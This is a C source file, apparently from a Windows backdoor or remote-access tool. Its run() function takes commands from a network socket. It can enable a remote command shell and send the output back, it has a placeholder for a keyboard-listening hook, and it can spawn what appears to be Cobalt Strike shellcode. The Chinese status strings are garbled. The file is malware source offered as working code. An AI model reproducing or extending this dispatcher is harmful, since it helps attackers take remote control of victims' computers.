#include "run.h"
#include "baseFunction.h"
#include <windows.h>
#include "choice.h"
#define MSG_LEN 10244
static int Useshell = 0;
void run(char *cmdLine, char *message, SOCKET sockClient) {
	trim(cmdLine);
	if (strcmp(cmdLine, "shell") == 0) {
		Useshell = 1;
		strcpy(message, "shell�ѿ���\n");
		send(sockClient,"shell�ѿ���\n",30,0);
		return;
	}
	else if (strcmp(cmdLine, "exit") == 0) {
		Useshell = 0;
		strcpy(message, "shell�ѹر�\n");
		return;
	}
	else if (strcmp(cmdLine, "keyboardListen") == 0) {
		//hook()
		strcpy(message, "�ӿ���δ����");
		return;
	}
	else if (strcmp(cmdLine, "SpawnCS") == 0) {
		strcpy(message, "Welcome Spawn Your Shell.........");
		send(sockClient,message,50,0);
		SpawnByShellcode(sockClient);
		return;
	}
	else if (Useshell == 1) {
		cmd(cmdLine, message);
		send(sockClient,message,MSG_LEN,0);
	}
	else {
		strcpy(message, "�������\n������  shell��keyboardListen ");
		return;
	}
}